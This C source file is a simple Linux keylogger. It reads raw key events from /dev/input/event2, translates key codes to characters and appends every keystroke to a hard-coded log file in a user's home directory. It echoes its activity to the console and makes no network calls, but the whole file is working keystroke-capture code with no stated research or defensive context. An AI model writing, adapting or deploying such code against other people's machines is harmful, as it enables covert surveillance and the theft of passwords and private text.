#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <linux/input.h>
#include <errno.h>

#define LOGFILE "/home/ganol/data"

char *keymap[256] = {
    [2] = "1", [3] = "2", [4] = "3", [5] = "4", [6] = "5", [7] = "6", [8] = "7", [9] = "8", [10] = "9", [11] = "0",
    [12] = "-", [13] = "=", [16] = "q", [17] = "w", [18] = "e", [19] = "r", [20] = "t", [21] = "y", [22] = "u",
    [23] = "i", [24] = "o", [25] = "p", [26] = "[", [27] = "]", [30] = "a", [31] = "s", [32] = "d", [33] = "f",
    [34] = "g", [35] = "h", [36] = "j", [37] = "k", [38] = "l", [39] = ";", [40] = "'", [43] = "\\", [44] = "z",
    [45] = "x", [46] = "c", [47] = "v", [48] = "b", [49] = "n", [50] = "m", [51] = ",", [52] = ".", [53] = "/",
    [57] = " "
};

int main(int argc, char **argv) {
    struct input_event ev;
    int fd = open("/dev/input/event2", O_RDONLY);
    if (fd == -1) {
        perror("Cannot open event device");
        return 1;
    }

    FILE *fp = fopen(LOGFILE, "a");
    if (fp == NULL) {
        perror("Cannot open log file");
        close(fd);
        return 1;
    }

    printf("Logging started. Press keys to log.\n");

    while (1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n == (ssize_t)-1) {
            perror("Error reading from event device");
            break;
        }

        if (ev.type == EV_KEY && ev.value == 0) {
            printf("Key released: code=%d\n", ev.code);

            if (ev.code < 256 && keymap[ev.code]) {
                fprintf(fp, "%s", keymap[ev.code]);
            }

	    else {
                fprintf(fp, "?");
                printf("Unmapped key code: %d\n", ev.code);
            }
            fflush(fp);
        }
    }

    fclose(fp);
    close(fd);
    return 0;
}